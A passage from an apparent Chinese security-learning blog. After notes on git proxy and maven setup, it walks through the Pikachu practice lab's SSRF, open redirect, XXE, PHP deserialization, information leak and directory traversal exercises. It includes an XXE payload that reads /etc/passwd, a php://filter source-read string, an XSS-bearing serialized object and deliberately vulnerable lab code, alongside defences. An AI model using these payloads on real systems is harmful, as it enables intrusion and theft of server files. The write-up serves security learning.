title="1、git开代理还是慢，且容易报error"></a>1、git开代理还是慢，且容易报error</h3><p>这里直接把git的代理改成对应cfw的代理即可,一般是7890，然后记得http和https都改一下<a href="https://blog.csdn.net/HD243608836/article/details/127869482">参考</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global --list</span><br><span class="line">git config --global http.proxy s&quot;代理地址&quot;</span><br><span class="line">git config --global https.proxy &quot;代理地址&quot;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240811191452718.png" alt="image-20240811191452718"></p><p>gitcheckout:<a href="https://blog.csdn.net/raoxiaoya/article/details/111321583">https://blog.csdn.net/raoxiaoya/article/details/111321583</a></p><h3 id="2、mvn编译错误"><a href="#2、mvn编译错误" class="headerlink" title="2、mvn编译错误"></a>2、<a href="https://blog.csdn.net/qq_38376348/article/details/108962790">mvn编译错误</a></h3><p><img src="/../image/image-20240812093534602.png" alt="image-20240812093534602"></p><p>修改为自己的jdk版本，然后再修改maven的conf文件里的toolchain</p><p><img src="/../image/image-20240812093824131.png" alt="image-20240812093824131"></p><p>记得别在注释里改，一直没用。。。这里用不了1.8，我们换一个1.6的</p><h2 id="知识扩展"><a href="#知识扩展" class="headerlink" title="知识扩展"></a>知识扩展</h2><p>在视频的链接中，我听到老师说，CC和CB</p><p>CC是指<strong>CommonsCollections</strong></p><p>CB是指<strong>commons-beanutils</strong></p><p>这两个都是java反序列化漏洞中常用的依赖，我们经常说的CC链和CB链就是这两个东西的利用</p><p><a href="https://www.freebuf.com/articles/web/377910.html">https://www.freebuf.com/articles/web/377910.html</a></p><p><a href="https://blog.csdn.net/2301_79724395/article/details/138115837">https://blog.csdn.net/2301_79724395/article/details/138115837</a></p><p>后面可以补充下这两个的学习</p>]]></content>
      
      
      
        <tags>
            
            <tag> env </tag>
            
            <tag> git </tag>
            
            <tag> shiro </tag>
            
            <tag> 550 </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pikachu</title>
      <link href="/2024/08/11/pikachu/"/>
      <url>/2024/08/11/pikachu/</url>
      
        <content type="html"><![CDATA[<p>攻略：<a href="https://blog.csdn.net/qq_53571321/article/details/121692906">https://blog.csdn.net/qq_53571321/article/details/121692906</a></p><p><a href="https://blog.csdn.net/qq_65165505/article/details/131568188">https://blog.csdn.net/qq_65165505/article/details/131568188</a></p><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>原理、绕过、防御的介绍：<a href="https://blog.csdn.net/qq_43378996/article/details/124050308">https://blog.csdn.net/qq_43378996/article/details/124050308</a></p><p><strong>SSRF(Server-Side Request Forgery:服务器端请求伪造)</strong></p><p>其形成的原因大都是由于服务端<strong>提供了从其他服务器应用获取数据的功能</strong>,但又没有对目标地址做严格过滤与限制</p><p>导致攻击者可以传入任意的地址来让后端服务器对其发起请求,并返回对该目标地址请求的数据</p><p>数据流:攻击者—–&gt;服务器—-&gt;目标地址</p><p>根据后台使用的函数的不同,对应的影响和利用方法又有不一样</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PHP中下面函数的使用不当会导致SSRF:</span><br><span class="line">file_get_contents()</span><br><span class="line">fsockopen()</span><br><span class="line">curl_exec()</span><br><span class="line">            </span><br></pre></td></tr></table></figure><p>如果一定要通过后台服务器远程去对用户指定(“或者预埋在前端的请求”)的地址进行资源请求,<strong>则请做好目标地址的过滤</strong>。</p><h2 id="SSRF（curl）"><a href="#SSRF（curl）" class="headerlink" title="SSRF（curl）"></a>SSRF（curl）</h2><p><img src="/../image/image-20240708210944040-1723344400328-45.png" alt="image-20240708210944040"></p><p>页面只有一个可点击的文字，不懂跳转到哪，尝试点击</p><p><img src="/../image/image-20240708211013270-1723344400329-46.png" alt="image-20240708211013270"></p><p>可以看到点击后，向该文件传了个url参数，可以尝试通过该参数去访问外站，或获取相应内网信息，先试试访问百度，发现确实可以</p><p><img src="/../image/image-20240708211322955-1723344400329-47.png" alt="image-20240708211322955"></p><p><strong>核心代码</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>] != <span class="literal">null</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//接收前端URL没问题,但是要做好过滤,如果不做过滤,就会导致SSRF</span></span><br><span class="line">    <span class="variable">$URL</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$CH</span> = <span class="title function_ invoke__">curl_init</span>(<span class="variable">$URL</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$CH</span>, CURLOPT_HEADER, <span class="literal">FALSE</span>); <span class="comment">//CURLOPT_HEADER 设置为 FALSE，表示不包含响应头部信息。</span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$CH</span>, CURLOPT_SSL_VERIFYPEER, <span class="literal">FALSE</span>);<span class="comment">//CURLOPT_SSL_VERIFYPEER 设置为 FALSE，表示不验证对等证书。</span></span><br><span class="line">    <span class="variable">$RES</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$CH</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$CH</span>) ;</span><br><span class="line"><span class="comment">//ssrf的问是:前端传进来的url被后台使用curl_exec()进行了请求,然后将请求的结果又返回给了前端。</span></span><br><span class="line"><span class="comment">//除了http/https外,curl还支持一些其他的协议curl --version 可以查看其支持的协议,telnet</span></span><br><span class="line"><span class="comment">//curl支持很多协议，有FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE以及LDAP</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$RES</span>;</span><br></pre></td></tr></table></figure><p>就是将传入的连接用curl执行，返回信息存到$RES,最后打印出来</p><p>所以，接收URL时要注意过滤,同时这个漏洞也可以被利用来获取真实ip，把传入的url换成相应的dnslog网站即可<a href="https://blog.csdn.net/weixin_39190897/article/details/117197126">https://blog.csdn.net/weixin_39190897/article/details/117197126</a></p><p><img src="/../image/image-20240708220957902-1723344400329-53.png" alt="image-20240708220957902"></p><p>不懂怎么解析在这</p><h2 id="SSRF（file-get-content）"><a href="#SSRF（file-get-content）" class="headerlink" title="SSRF（file_get_content）"></a>SSRF（file_get_content）</h2><p><img src="/../image/image-20240708211751105-1723344400329-52.png" alt="image-20240708211751105"></p><p>同样的操作，这里不再是传url了而是file，说明ssrf不仅可以利用来访问外站，还可以内部横向获取信息，我们尝试利用目录遍历，看看能不能访问到敏感文件</p><p><img src="/../image/image-20240708211920880-1723344400329-50.png" alt="image-20240708211920880"></p><p>可以看到确实访问了敏感文件，这也是ssrf不出网的一种利用方式，这里有gopher版本的<a href="https://blog.csdn.net/weixin_43221560/article/details/108107826">https://blog.csdn.net/weixin_43221560/article/details/108107826</a></p><p><strong>核心代码</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//读取PHP文件的源码:php://filter/read=convert.base64-encode/resource=ssrf.php</span></span><br><span class="line"><span class="comment">//内网请求:http://x.x.x.x/xx.index</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] !=<span class="literal">null</span>)&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="variable">$str</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键就是使用 file_get_contents() 函数读取文件内容，并将结果存储在 $str 变量中</p><h1 id="URL重定向"><a href="#URL重定向" class="headerlink" title="URL重定向"></a>URL重定向</h1><p>不安全的url跳转问题可能发生在一切执行了url地址跳转的地方。<br>如果后端采用了前端传进来的(可能是用户传参,或者之前预埋在前端页面的url地址)参数作为了跳转的目的地,而又没有做判断的话<br>就可能发生”跳错对象”的问题。</p><p>url跳转比较直接的危害是:<br>–&gt;钓鱼,既攻击者使用漏洞方的域名(比如一个比较出名的公司域名往往会让用户放心的点击)做掩盖,而最终跳转的确实钓鱼网站</p><p>这个主要就是点击连接跳转的不是自己想去的地址</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, redirect</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="comment"># 重定向到另一个页面</span></span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&#x27;/home&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/home&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;欢迎来到主页！&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这个就是一个重定向的过程，当我们访问网站根目录是会跳转到home</p><p><img src="/../image/image-20240708221951073-1723344400329-48.png" alt="image-20240708221951073"></p><p>这时候如果我们将他换成baidu首页试试</p><p><img src="/../image/image-20240708222044277-1723344400329-49.png" alt="image-20240708222044277"></p><p>你会发现访问连接后直接来到baidu页面</p><h1 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h1><p>介绍：<a href="https://security.tencent.com/index.php/blog/msg/69">https://security.tencent.com/index.php/blog/msg/69</a></p><p>XXE -“xml external entity injection”<br>既”xml外部实体注入漏洞”。<br>概括一下就是”攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题”<br>也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。</p><p>具体的关于xml实体的介绍,网络上有很多,自己动手先查一下。<br>现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的,从而也就直接避免了这个漏洞。<br>以PHP为例,在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。</p><p>本章提供的案例中,为了模拟漏洞,通过手动指定LIBXML_NOENT选项开启了xml外部实体解析。</p><p><img src="/../image/image-20240708222329045-1723344400329-51.png" alt="image-20240708222329045"></p><p>这里会提交一个表单，我们先随便输点东西，抓包下来分析数据包</p><p><img src="/../image/image-20240708223008798-1723344400329-54.png" alt="image-20240708223008798"></p><p>可以看到xml是作为post的请求体传输的，里面一个参数xml和提交的url编码，这里我们可以通过对修改xml为对应的xml信息</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = <span class="string">&quot;1.0&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [     <span class="meta">&lt;!ENTITY <span class="keyword">hacker</span> <span class="string">&quot;xxe&quot;</span>&gt;</span> ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;hacker;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br></pre></td></tr></table></figure><p>传递参数的时候要记得url编码</p><p><img src="/../image/image-20240708223442244-1723344400329-56.png" alt="image-20240708223442244"></p><p><img src="/../image/image-20240708223850475-1723344400329-57.png" alt="image-20240708223850475"></p><p>也可以读取文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version = &quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">    &lt;!ENTITY f SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;x&gt;&amp;f;&lt;/x&gt;</span><br></pre></td></tr></table></figure><p>同样url编码一下</p><p><img src="/../image/image-20240708225101910-1723344400329-60.png" alt="image-20240708225101910"></p><p><strong>核心代码：</strong></p><h2 id="防范方法"><a href="#防范方法" class="headerlink" title="防范方法"></a>防范方法</h2><ol><li><p>严格检查用户输入的字符；</p></li><li><p>检查使用的底层XML解析库，使用禁用外部实体的方法</p></li><li><p>JAVA下：</p></li></ol><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span>DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(<span class="literal">false</span>)；</span><br><span class="line">dbf.setExpandEntityReferences(<span class="literal">false</span>);</span><br></pre></td></tr></table></figure><ol start="2"><li>PHP下:</li></ol><p>libxml_disable_entity_loader(true);</p><ol start="3"><li>Python下：</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure><ol start="3"><li>操作XML时对格式字符进行转义处理，常见的格式字符如下表： &amp;lt； &lt; &gt; &gt; &amp; &amp; ‘ ‘ “ “</li></ol><h1 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h1><p><em>个人笔记：E:\Youzipii\source_posts\php-SER-libs.md</em></p><p>在理解这个漏洞前,你需要先搞清楚php中serialize()，unserialize()这两个函数。</p><p><strong>序列化serialize()</strong><br>序列化说通俗点就是把一个对象变成可以传输的字符串,比如下面是一个对象:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class S&#123;</span><br><span class="line">    public $test=&quot;pikachu&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$s=new S(); //创建一个对象</span><br><span class="line">serialize($s); //把这个对象进行序列化</span><br><span class="line">序列化后得到的结果是这个样子的:O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;</span><br><span class="line">    O:代表object</span><br><span class="line">    1:代表对象名字长度为一个字符</span><br><span class="line">    S:对象的名称</span><br><span class="line">    1:代表对象里面有一个变量</span><br><span class="line">    s:数据类型</span><br><span class="line">    4:变量名称的长度</span><br><span class="line">    test:变量名称</span><br><span class="line">    s:数据类型</span><br><span class="line">    7:变量值的长度</span><br><span class="line">    pikachu:变量值</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>反序列化unserialize()</strong></p><p>就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$u=unserialize(&quot;O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:7:&quot;pikachu&quot;;&#125;&quot;);</span><br><span class="line">echo $u-&gt;test; //得到的结果为pikachu</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">常见的几个魔法函数:</span><br><span class="line">__construct()当一个对象创建时被调用</span><br><span class="line"></span><br><span class="line">__destruct()当一个对象销毁时被调用</span><br><span class="line"></span><br><span class="line">__toString()当一个对象被当作一个字符串使用</span><br><span class="line"></span><br><span class="line">__sleep() 在对象在被序列化之前运行</span><br><span class="line"></span><br><span class="line">__wakeup将在序列化之后立即被调用</span><br><span class="line"></span><br><span class="line">漏洞举例:</span><br><span class="line"></span><br><span class="line">class S&#123;</span><br><span class="line">    var $test = &quot;pikachu&quot;;</span><br><span class="line">    function __destruct()&#123;</span><br><span class="line">        echo $this-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$s = $_GET[&#x27;test&#x27;];</span><br><span class="line">@$unser = unserialize($a);</span><br><span class="line"></span><br><span class="line">payload:O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../image/image-20240708224430307-1723344400329-55.png" alt="image-20240708224430307"></p><p>这里我们先查看源代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by runner.han</span></span><br><span class="line"><span class="comment"> * There is nothing new under the sun</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">$SELF_PAGE</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>],<span class="string">&#x27;/&#x27;</span>)+<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$SELF_PAGE</span> = <span class="string">&quot;unser.php&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$ACTIVE</span> = <span class="keyword">array</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;active open&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;active&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$PIKA_ROOT_DIR</span> =  <span class="string">&quot;../../&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="variable">$PIKA_ROOT_DIR</span>.<span class="string">&#x27;header.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;pikachu&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;&#125;</span></span><br><span class="line"><span class="variable">$html</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;o&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!@<span class="variable">$unser</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;大兄弟,来点劲爆点儿的!&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$html</span>.=<span class="string">&quot;&lt;p&gt;<span class="subst">&#123;$unser-&gt;test&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>简单分析下逻辑，我们需要触发的魔术方法是construct，这个是在对象创建的时候自动调用的，当我们反序列化一串序列化后的对象，就会触发这个方法，且方法的功能是将pikachu写道test‘里，我们需要将test改为我们想输出的内容，比如弹窗</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">S</span></span>&#123; </span><br><span class="line"><span class="keyword">var</span> <span class="variable">$test</span>=<span class="string">&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>;</span><br><span class="line">&#125;    </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">S</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:25:&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;;&#125;</span></span><br></pre></td></tr></table></figure><p>在线运行即可，再将打印的序列化的字符串输入测试</p><p><img src="/../image/image-20240709102631819-1723344400329-58.png" alt="image-20240709102631819"></p><h1 id="敏感信息泄露概述"><a href="#敏感信息泄露概述" class="headerlink" title="敏感信息泄露概述"></a><strong>敏感信息泄露概述</strong></h1><p>由于后台人员的疏忽或者不当的设计，导致不应该被前端用户看到的数据被轻易的访问到。 比如：<br>—通过访问url下的目录，可以直接列出目录下的文件列表;<br>—输入错误的url参数后报错信息里面包含操作系统、中间件、开发语言的版本或其他信息;<br>—前端的源码（html,css,js）里面包含了敏感信息，比如后台登录地址、内网接口信息、甚至账号密码等;</p><p>类似以上这些情况，我们成为敏感信息泄露。敏感信息泄露虽然一直被评为危害比较低的漏洞，但这些敏感信息往往给攻击着实施进一步的攻击提供很大的帮助,甚至“离谱”的敏感信息泄露也会直接造成严重的损失。 因此,在web应用的开发上，除了要进行安全的代码编写，也需要注意对敏感信息的合理处理。</p><p><img src="/../image/image-20240709102936207-1723344400329-61.png" alt="image-20240709102936207"></p><p>在测试页面能找到账号密码</p><h1 id="目录遍历漏洞"><a href="#目录遍历漏洞" class="headerlink" title="目录遍历漏洞"></a><strong>目录遍历漏洞</strong></h1><p>在web功能设计中,很多时候我们会要将需要访问的文件定义成变量，从而让前端的功能便的更加灵活。 当用户发起一个前端的请求时，便会将请求的这个文件的值(比如文件名称)传递到后台，后台再执行其对应的文件。 在这个过程中，如果后台没有对前端传进来的值进行严格的安全考虑，则攻击者可能会通过“..&#x2F;”这样的手段让后台打开或者执行一些其他的文件。 从而导致后台服务器上其他目录的文件结果被遍历出来，形成目录遍历漏洞。</p><p>看到这里,你可能会觉得目录遍历漏洞和不安全的文件下载，甚至文件包含漏洞有差不多的意思，是的，目录遍历漏洞形成的最主要的原因跟这两者一样，都是在功能设计中将要操作的文件使用变量的 方式传递给了后台，而又没有进行严格的安全考虑而造成的，只是出现的位置所展现的现象不一样，因此，这里还是单独拿出来定义一下。</p><p>需要区分一下的是,如果你通过不带参数的url（比如：<a 